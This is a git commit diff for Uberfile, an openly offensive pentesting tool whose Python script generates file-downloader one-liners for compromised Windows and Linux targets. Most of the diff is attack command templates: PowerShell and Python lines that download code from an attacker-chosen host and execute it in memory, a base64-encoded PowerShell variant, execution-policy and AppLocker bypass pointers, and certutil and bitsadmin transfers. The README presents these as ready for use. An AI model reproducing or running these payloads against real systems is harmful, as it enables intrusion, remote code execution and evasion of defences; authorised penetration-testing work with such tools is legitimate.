2d9c0e5e8925a54176724d6e7a4881ec6fac2887
Shutdown <nwodtuhs@pm.me>
2020-11-19 13:37:31 +0100

    Preparing code and repo for release

--- README.md
+++ README.md
@@ -1,2 +1,42 @@
-# uberfile
-A Python script that outputs a downloader oneliner for UNIX-like or Windows systems
+# Uberfile
+  Uberfile is a simple command-line tool aimed to help pentesters quickly generate file downloader one-liners in multiple contexts (wget, curl, powershell, certutil...).
+  This project code is based on my other similar project for one-liner reverseshell generation [Shellerator](https://github.com/ShutdownRepo/shellerator).
+
+  This project is installed by default in the pentesting OS [Exegol](https://github.com/ShutdownRepo/Exegol)
+
+# Install
+  The install is pretty simple, just clone this git and install the requirements.
+  ```
+  git clone https://github.com/ShutdownRepo/uberfile
+  pip3 install --user -r requirements.txt
+  ```
+
+# Usage
+  Usage is dead simple too.
+  ```
+  usage: uberfile.py [-h] [-lp LPORT] [-lh LHOST] [-t {windows,linux}] [-d TYPE] [-f INPUTFILE] [-o OUTPUTFILE] [-l]
+
+  Generate a file downloader command
+
+  optional arguments:
+    -h, --help            show this help message and exit
+    -lp LPORT, --lport LPORT
+                          Server port
+    -lh LHOST, --lhost LHOST
+                          Server address
+    -t {windows,linux}, --target-os {windows,linux}
+                          Target machine operating system
+    -d TYPE, --downloader TYPE
+                          Downloader
+    -f INPUTFILE, --input-file INPUTFILE
+                          File to be downloaded
+    -o OUTPUTFILE, --output-file OUTPUTFILE
+                          File to write on the target machine
+    -l, --list            Print all the commands UberFiles can generate
+  ```
+  If required options are not set, the tool will start in TUI (Terminal User Interface) with pretty menus.
+
+# Sources
+  Some commands come from the following links
+  - https://www.ired.team/
+  - https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
--- uberfile.py
+++ uberfile.py
@@ -3,6 +3,7 @@
 # Author: Amine B (en1ma - @_1mean)
 
 import argparse
+from base64 import b64encode
 import sys
 import os
 import re
@@ -16,7 +17,7 @@ if platform.system() == 'Windows':
 else:
     from simple_term_menu import TerminalMenu
 
-def MENU(title, menu_list):
+def menu(title, menu_list):
     if platform.system() == 'Windows':
         selection = SelectionMenu.get_selection(menu_list, title=title, show_exit_option=False)
     else:
@@ -24,9 +25,9 @@ def MENU(title, menu_list):
         selection = menu.show()
     return menu_list[selection]
 
-def MENU_WITH_CUSTOM(title, menu_list):
+def menu_with_custom_choice(title, menu_list):
     menu_list.append('Custom')
-    selection = MENU(title, menu_list)
+    selection = menu(title, menu_list)
     if selection == 'Custom':
         print(f'(custom) {title}')
         if platform.system() == 'Windows':
@@ -37,7 +38,7 @@ def MENU_WITH_CUSTOM(title, menu_list):
     else:
         return selection.split('(')[1].split(')')[0]
 
-def MENU_interface():
+def select_address():
     interfaces = {}
     net_if_addrs = psutil.net_if_addrs()
     for iface, addr in net_if_addrs.items():
@@ -51,7 +52,7 @@ def MENU_interface():
     for key in interfaces:
         menu_list.append(key + ' (' + interfaces[key] + ')')
 
-    return MENU_WITH_CUSTOM("Interface?", menu_list)
+    return menu_with_custom_choice("Interface/address serving the files?", menu_list)
 
 def list_downloaders():
     print(Fore.BLUE + Style.BRIGHT + 'Windows downloaders' + Style.RESET_ALL)
@@ -76,31 +77,34 @@ def get_options():
     if options.LIST:
         list_downloaders()
     if not options.TARGETOS:
-        options.TARGETOS = MENU("What operating system is the target running?", ['windows','linux'])
+        options.TARGETOS = menu("What operating system is the target running?", ['windows','linux'])
     if not options.TYPE:
         downloaders_dict = globals()[options.TARGETOS]
         menu_list = sorted(list(downloaders_dict.keys()))
-        options.TYPE = MENU("What type of downloader do you want?", menu_list)
+        options.TYPE = menu("What type of downloader do you want?", menu_list)
     if not options.LHOST:
-        options.LHOST = MENU_interface()
+        options.LHOST = select_address()
     if not options.LPORT:
         menu_list = [
-            'Default (1337)',
+            'updog (9090)',
+            'python http server (8000)',
             'HTTP (80)',
-            'HTTPS (443)',
-            'DNS (53)'
+            'HTTPS (443)'
         ]
-        options.LPORT = MENU_WITH_CUSTOM("Port?", menu_list)
+        options.LPORT = menu_with_custom_choice("Port serving the files?", menu_list)
     if not options.INPUTFILE:
         lookupdir = os.getcwd()
         menu_list = [ f for f in os.listdir(lookupdir) if os.path.isfile(os.path.join(lookupdir, f)) ]
-        options.INPUTFILE = MENU('Which file do you want the target to download?', menu_list)
+        options.INPUTFILE = menu('Which file do you want the target to download?', menu_list)
     if not options.OUTPUTFILE:
-        menu_list = [
-            'Input filename ({})'.format(options.INPUTFILE),
-            'Some legit name (licence.txt)'
-        ]
-        options.OUTPUTFILE = MENU_WITH_CUSTOM("Filename to write on the target machine?", menu_list)
+        menu_list = ['Same filename ({})'.format(options.INPUTFILE)]
+        if options.TARGETOS == "windows":
+            menu_list.append('Same filename in temp ({})'.format('C:\Temp\\' + options.INPUTFILE))
+            # TODO: add legit names
+            #menu_list.append('Some legit name ({})'.format('licence.txt'))
+        if options.TARGETOS == "linux":
+            menu_list.append('Same filename in /tmp ({})'.format('/tmp/' + options.INPUTFILE))
+        options.OUTPUTFILE = menu_with_custom_choice("Filename to write on the target machine?", menu_list)
     return options
 
 # Helper function for populate_downloaders() to add values to the dictionnaries
@@ -115,17 +119,34 @@ def add_downloader(downloaders_dict, type, downloader, notes=None):
 # Add downloaders to the main dictionnaries: windows and linux
 def populate_downloaders():
     ## TODO: populate this
-    add_downloader(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
+    add_downloader(linux, 'curl', '''curl http://{LHOST}:{LPORT}/{INPUTFILE} -o {OUTPUTFILE}''')
     add_downloader(linux, 'wget', '''wget {LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}''')
-    add_downloader(windows, 'powershell', '''powershell.exe Invoke-WebRequest -Uri http://{LHOST}:{LPORT}/{INPUTFILE} -OutFile '{OUTPUTFILE}' ''')
-    add_downloader(windows, 'powershell', '''powershell.exe Start-BitsTransfer -Source http://{LHOST}:{LPORT}/{INPUTFILE} -Destination '{OUTPUTFILE}' ''')
-    add_downloader(downloaders_dict=windows, type='powershell', notes="Execute in memory without writing to disk", downloader='''powershell.exe IED()TODOOOO''')
+    add_downloader(downloaders_dict=linux, type='python', notes="In memory", downloader=''''python -c "import urllib2; exec urllib2.urlopen('{LHOST}:{LPORT}/{INPUTFILE}').read()"''')
+    add_downloader(windows, 'certutil', '''certutil.exe -urlcache -f http://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}''')
+    add_downloader(windows, 'powershell', '''powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://{LHOST}:{LPORT}/{INPUTFILE}','{OUTPUTFILE}')"''')
+    add_downloader(windows, 'powershell', '''powershell.exe -c "Invoke-WebRequest 'http://{LHOST}:{LPORT}/{INPUTFILE}' -OutFile '{OUTPUTFILE}' ''')
+    add_downloader(windows, 'powershell', '''powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LHOST}:{LPORT}/{INPUTFILE}' -Destination '{OUTPUTFILE}'"''')
+    add_downloader(windows, 'powershell', '''powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LHOST}:{LPORT}/{INPUTFILE}' -Destination '{OUTPUTFILE}' -Asynchronous"''')
+    add_downloader(downloaders_dict=windows, type='powershell', notes="In memory", downloader='''powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/{INPUTFILE}')"''')
+    add_downloader(downloaders_dict=windows, type='powershell', notes="In memory", downloader='''powershell.exe -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://{LHOST}:{LPORT}/{INPUTFILE}')|iex"''')
+    add_downloader(windows, 'bitsadmin', '''bitsadmin.exe /transfer 5720 /download /priority normal http://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}''')
+    add_downloader(windows, 'wget', '''wget "http://{LHOST}:{LPORT}/{INPUTFILE}" -OutFile "{OUTPUTFILE}"''')
+    add_downloader(downloaders_dict=windows, type='regsvr32', notes="AppLocker bypass", downloader='''https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/''')
+
+# Add downloaders to the main dictionnaries: windows and linux
+# this function is called after getting the options allowing commands to be generated with the values right now
+# this allows for the generation of more complex commands (i.e. base64 encoded) but
+# bear in mind the downloader type must already exist in populate_downloaders() for it to be listed when calling get_options()
+def populate_post_options_downloaders():
+    add_downloader(downloaders_dict=windows, type='powershell', notes="In memory (base64)", downloader='''powershell.exe -nop -enc "{}"'''.format(b64encode("IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/{INPUTFILE}')".replace('{LHOST}', options.LHOST).replace('{LPORT}',options.LPORT).replace('{INPUTFILE}',options.INPUTFILE).replace('{OUTPUTFILE}',options.OUTPUTFILE).encode('UTF-16LE')).decode('utf-8')))
+    add_downloader(downloaders_dict=windows, type='powershell', notes="Execution policy bypass", downloader='''https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#execution-policy''')
 
 if __name__ == '__main__':
     windows = {}
     linux = {}
     populate_downloaders()
     options = get_options()
+    populate_post_options_downloaders()
     downloaders_dict = globals()[options.TARGETOS]
     print()
     for notes, downloader in downloaders_dict[options.TYPE]:
@@ -136,4 +157,4 @@ if __name__ == '__main__':
             print_notes = notes + ' '
         print(Fore.BLUE + Style.BRIGHT + '[' + str(downloader_index) + '] ' + print_notes + Style.RESET_ALL + print_downloader + '\n')
     cmdline = f'{sys.argv[0]} --lhost {options.LHOST} --lport {options.LPORT} --target-os {options.TARGETOS} --downloader {options.TYPE} --input-file {options.INPUTFILE} --output-file {options.OUTPUTFILE}'
-    print(Fore.RED + Style.BRIGHT + '---\n[*] ' + "CLI command used " + Style.RESET_ALL + cmdline + '\n')
+    print(Fore.RED + Style.BRIGHT + 'CLI command used\n' + Style.RESET_ALL + cmdline + '\n')
